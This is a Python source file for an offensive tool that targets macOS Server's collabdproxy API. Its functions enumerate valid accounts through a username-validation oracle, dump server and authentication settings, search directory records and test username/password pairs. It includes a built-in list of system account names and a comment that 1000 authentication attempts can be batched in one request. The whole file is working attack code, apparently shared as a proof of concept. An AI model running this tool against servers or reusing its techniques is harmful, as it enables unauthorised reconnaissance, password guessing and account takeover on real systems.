#macOS_Server_Enum.py
#created by: Matt "Rudy" (@ruddawg26)
#Tool to enumerate MAC Server utilizing the collabdproxy. Should also be able to use some of the functions/methods to build other tools as there are a lot of differnet servicenames and methodnames that can interact with the collabdproxy. I did not determine all of them that are out there or specific usecases for all of them.

import json
import argparse
import requests
import warnings
warnings.filterwarnings("ignore")

class TypeRequest:
    def __init__(self, type, serviceName, methodName, arguments=[], sessionGUID="", expandReferencedObjects="", subpropertyPaths =[]):
        self.type = type
        self.serviceName = serviceName
        self.methodName = methodName
        self.arguments = arguments
        self.sessionGUID = sessionGUID
        self.expandReferncedObjects = expandReferencedObjects
        self.subpropertyPaths = subpropertyPaths

    #help from CyberButler improved this
    def __iter__(self):
            for attr, value in self.__dict__.items():
                yield attr, value

    def toDictPayload(self):
        return dict(filter(lambda x: x[1], self))
    
    def toJsonPayload(self):
        return json.dumps(self.toDictPayload())

#Started creating this but never finshed, I don't think it is used anywehre yet    
class TypeRsponse:
    def __init__(self, response):
        json.loads(response)


class ServiceRequest(TypeRequest):
    def __init__(self, *args, **kwargs):
        super().__init__(self,*args, **kwargs)
        self.type = "com.apple.ServiceRequest"


#You can batch all the requets into a Batch Request, even multiple authentication attempts in one request. Have tested up to 1000 authentication attempts in the same Batch Request. I don't use this in the auth attempts to batch them together or enum, but it could be setup to do it that way if desired.
class BatchRequest:
    def __init__(self, batchrequests):
        self.type="com.apple.BatchServiceRequest"
        self.requests=batchrequests

    def toDictPayload(self):
        return self.__dict__
    
    def toJsonPayload(self):
        return json.dumps(self.__dict__)
    

#The Key function for making the request at the Mac Server
def makeRequest(host, Payload):
    url=f"https://{host}/collabdproxy"
    try:
        r = requests.put(url, json=Payload.toDictPayload(), verify=False, timeout=10)
        if r.status_code == 502:
            print("HTTP 502 Error")
            error = '{"error":"error"}'
            return error
        return r.json()
    except requests.exceptions.RequestException as errh:
        error = '{"error":"error"}'
        return error

#The following function created by @cyberbutler. It just provides better info based on the build number for the getServerVersion function so you don't have to look it up on google yourself. 
def translate_build_number(buildnum):
    versiondata = [[""], ["", "Versions", "Build", "Release Date"], ["", "macOS Server 5.0.3", "15S2257", "September 16, 2015"], ["", "macOS Server 5.0.4", "15S2259", "September 21, 2015"], ["", "macOS Server 5.0.15", "15S4033", "October 21, 2015"], ["", "macOS Server 5.1", "15S5127", "March 21, 2016"], ["", "macOS Server 5.1.5", "15S7047", "May 16, 2016"], ["", "macOS Server 5.1.7", "15S7055", "July 18, 2016"], ["", "macOS Server 5.2", "16S1195", "September 20, 2016"], ["", "macOS Server 5.3", "16S4123", "March 27, 2017"], ["", "macOS Server 5.3.1", "16S4128", "May 15, 2017"], ["", "macOS Server 5.4", "17S1207", "September 25, 2017"], ["", "macOS Server 5.5", "17S1220", "January 23, 2018"], ["", "macOS Server 5.6", "17S2102", "March 28, 2018"], ["", "macOS Server 5.6.1", "17S2109", "April 16, 2018"], ["", "macOS Server 5.6.3", "17S2123", "September 17, 2018"], ["", "macOS Server 5.7.1", "18S1178", "September 28, 2018"], ["", "macOS Server 5.8", "18S2071", "March 25, 2019"], ["", "macOS Server 5.9", "19S1079", "October 8, 2019"], ["", "macOS Server 5.10", "20S2015", "April 1, 2020"], ["", "macOS Server 5.11", "20S5028", "December 14, 2020"], ["", "macOS Server 5.11.1", "Unknown", "May 2, 2021"], ["", "macOS Server 5.12", "Unknown", "December 8, 2021"], ["", "macOS Server 5.12.1", "Unknown", "January 10, 2022"], ["", "macOS Server 5.12.2", "Unknown", "April 21, 2022"]]
    for version in versiondata[1:]:
        if buildnum == version[2]:
            return version[1]


#gets the OS and Server Version. This makes the request as HTTP request via the Batch Request.
def getServerVersion(host):
    OSServerVersionPayloadJson=ServiceRequest("ServerVersionService","currentOperatingSystemVersion").toDictPayload()
    ServerVersionPayloadJson=ServiceRequest("ServerVersionService","currentServerVersion").toDictPayload()
    VersionResponse=makeRequest(host,BatchRequest([OSServerVersionPayloadJson,ServerVersionPayloadJson]))

    OSVersion=VersionResponse["responses"][0]["response"]
    ServerVersion=translate_build_number(VersionResponse["responses"][1]["response"])

    print(f"[i] - Operating System Version: {OSVersion}")
    print(f"[i] - Server Version: {ServerVersion}")

#Makes a request to validate if the user exists on the system. This also validates for Mac services and other accounts on the system.  Could also use for authetnication if you change the password. I would use the authenticate method, as it will return a session info with that serviceREquest
def enumUserRequest(host, username, password="thisisnottherightpassword"):
    validateUserPayloadJson=ServiceRequest("AuthService","validateUsername:andPassword:",arguments=[username,password])
    response = makeRequest(host,validateUserPayloadJson)
    if response == '{"error":"error"}':
        return
    result=response["response"]["exceptionName"]
    #print(f"  Results {username} from Auth Attempt: {result} ") 
    if result == "CSAuthBadPassword":
        print(f"[+] {username} - Validated on Host")

#Makes a request fo the diffenret server settings
def serverSettings(host):
    serverSettingsPayload = ServiceRequest("SettingsService", "serverSettings")
    response = makeRequest(host, serverSettingsPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Server Settings: {result}")

#Makes a request for the client settings
def clientSettings(host):
    serverSettingsPayload = ServiceRequest("SettingsService", "clientSettings")
    response = makeRequest(host, serverSettingsPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Client Settings: {result}")

#Makes a request to get the authentication settings on the server
def authSettings(host):
    serverSettingsPayload = ServiceRequest("SettingsService", "authSettings")
    response = makeRequest(host, serverSettingsPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Auth Settings: {result}")

#A search of records. There is actually another "SearchService" "query:" that can be use. With that you can provide other arguments to be even mroe specific in the search.  Not sure the difference in some of the search functionaility
def recordsSearch(host, searchString):
    searchPayload = ServiceRequest("ODService","odRecordsMatching:",arguments=[searchString])
    response = makeRequest(host, searchPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Search Results for \"{searchString}\": {result}")

def getRandomEntity(host):
    getRandomEntityPayload = ServiceRequest("ContentService", "randomEntity",expandReferencedObjects=True)
    response = makeRequest(host, getRandomEntityPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[+] Random Entity: {result}")

#Gets the number of currently active Users
def getNumActiveUsers(host):
    getNumActiveUsersPayload = ServiceRequest("AuthService", "countOfActiveUsers")
    response = makeRequest(host, getNumActiveUsersPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Current Number of Active Users: {result}")

#Determines the number of users that have been active on the server over the interval provided in seconds
def getActiveUsersTimeInterval(host, interval):
    getNumActiveUsersTimeIntervalPayload = ServiceRequest("AuthService", "countOfActiveUsersInInerval:", arguments = [interval])
    response = makeRequest(host, getNumActiveUsersTimeIntervalPayload)
    if response == '{"error":"error"}':
        return
    result = response["response"]
    print(f"[i] Current Number of Active Users in interval {interval}: {result}")


#For testing authentication there is the "AuthService" with the method "sessionForUsername:andPassword: the response is a GUID. If the account exists but is wrong password, you get an exception with "Invalid Credentials"
def authenticate(host, username, password):
    authenticatePayload = ServiceRequest("AuthService", "sessionForUsername:andPassword:", arguments =[username, password])
    response = makeRequest(host, authenticatePayload)
    if response == '{"error":"error"}':
        return
    if response["responseStatus"] == "succeeded":
        session = response["response"]
        print(f"[+] Authenticated Successfully with {username}:{password}")
        print(f"   [i] Authenticated GUID to use: {session}")
    else:
        if response["response"]["exceptionString"]:  # == "Invalid Credentials"
            print(f'[-] Failed to Authenticate with {username}:{password}. Exception: {response["response"]["exceptionName"]}')
            return

    
#The provided list of usernames was pulled from a random MAC's /etc/passwd, more for a a POC that the system is vulnerable.
def enumUsersProvidedList(host):
    print("[i] Start enumerating users based on a built-in list")
    
    userList=["nobody", "root", "daemon", "_uucp", "_taskgated", "_networkd", "_installassistant", "_lp", "_postfix", "_scsd", "_ces", "_appstore", "_mcxalr", "_appleevents", "_geod", "_devdocs", "_sandbox", "_mdnsresponder", "_ard", "_www", "_eppc", "_cvs", "_svn", "_mysql", "_sshd", "_qtss", "_cyrus", "_mailman", "_appserver", "_clamav", "_amavisd", "_jabber", "_appowner", "_windowserver", "_spotlight", "_tokend", "_securityagent", "_calendar", "_teamsserver", "_update_sharing", "_installer", "_atsserver", "_ftp", "_unknown", "_softwareupdate", "_coreaudiod", "_screensaver", "_locationd", "_trustevaluationagent", "_timezone", "_lda", "_cvmsroot", "_usbmuxd", "_dovecot", "_dpaudio", "_postgres", "_krbtgt", "_kadmin_admin", "_kadmin_changepw", "_devicemgr", "_webauthserver", "_netbios", "_warmd", "_dovenull", "_netstatistics", "_avbdeviced", "_krb_krbtgt", "_krb_kadmin", "_krb_changepw", "_krb_kerberos", "_krb_anonymous", "_assetcache", "_coremediaiod", "_launchservicesd", "_iconservices", "_distnote", "_nsurlsessiond", "_displaypolicyd", "_astris", "_krbfast", "_gamecontrollerd", "_mbsetupuser", "_ondemand", "_xserverdocs", "_wwwproxy", "_mobileasset", "_findmydevice", "_datadetectors", "_captiveagent", "_ctkd", "_applepay", "_hidd", "_cmiodalassistants", "_analyticsd", "_fpsd", "_timed", "_nearbyd", "_reportmemoryexception", "_driverkit", "_diskimagesiod", "_logd", "_appinstalld", "_installcoordinationd", "_demod", "_rmd", "_fud", "_knowledgegraphd", "_coreml", "_trustd", "_oahd"]
    for user in userList:
        enumUserRequest(host, user)

def enumUsersFile(host, file):
    print(f"Attempting to Enumerate users from the provide file at {file}")
    with open(args.file, 'r') as fileData:
        for user in fileData.readlines():
            #print(f"Trying {user.strip()}")
            enumUserRequest(host, user.strip())

#enumerate User request. Only returns the account if it receives the exceptionName of CSAuthBadPAssword
def AuthRequest(host, username, password="thisisnotthepassword"):
    validateUserPayloadJson=ServiceRequest("AuthService","validateUsername:andPassword:",arguments=[username,password])
    response = makeRequest(host,validateUserPayloadJson)
    if response == '{"error":"error"}':
        return
    result=response["response"]["exceptionName"]
    #print(f"  Results {username} from Auth Attempt: {result} ") 
    if result == "CSAuthBadPassword":
        print(f" [+] {username} - Validated on Host")

def main():
    host = args.host
    print(f"[i] - Testing against {host}")

    if(args.info):
        getServerVersion(host)
        serverSettings(host)
        clientSettings(host)
        authSettings(host)
        getNumActiveUsers(host)

    if(args.command == 'random'):
        getRandomEntity(host)

    if(args.command == 'enum'):
        if(args.list):
            enumUsersProvidedList(host)
        if(args.file):
            enumUsersFile(host, args.file)
        if(args.user):
            print(f"Enumerating supplied username: {args.user}")
            enumUserRequest(host,args.user)

    if(args.command == 'search'):
        recordsSearch(host, args.string)

    if(args.command == 'auth'):
        authenticate(host, args.user, args.password)
               

#Argument Parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAC Server X Enumerator - No cool name for the tool or ASCII Art")
    parser.add_argument('-H','--host', help="IP or FQDN of the target:MAC Server", required=True)

    parser.add_argument('-i','--info', default=False, action="store_true", help='Provides information on the Server, like the Version, auth settings, etc.')

    

    subparser_command = parser.add_subparsers(title='SubCommands', description="Options are for enumerating users, attempt to authenticate, search recrods or pulla rnadom Entity Record", dest='command')
    parser_enum = subparser_command.add_parser('enum', help="Enumerate Users: list, file, command-line supplied")

    parser_enum.add_argument('--list', default=False, action="store_true", help="built-in list that came from the /etc/passwd on a random MAC. Used for POC")
    parser_enum.add_argument('-u','--user',type=str, help="User supplied username that is to be tested for on the MAC Server")
    parser_enum.add_argument('-f','--file', default=False, help="A supplied file that has usernames to enumerate. the file should have a username on each line")

    parser_auth = subparser_command.add_parser('auth', help="Attempt to Authenticate a user")
    parser_auth.add_argument('-u','--user',type=str, required=True, help="User supplied username that is to be tested for on the MAC Server")
    parser_auth.add_argument('-p','--password',type=str, required=True, help="User supplied password that is to be tested for on the MAC Server")

    parser_search = subparser_command.add_parser('search', help="Search for Records")
    parser_search.add_argument('-s','--string', type=str, help="String to use to search for records. Can use wildcards")

    parser_random = subparser_command.add_parser('random', help="Do you feel lucky? Just pulls back details about a random entity, what random things does it pull back, who knows. Was easy to implement so did, not sure how this will help anything")
    
    args=parser.parse_args()  

#Run the tool
main()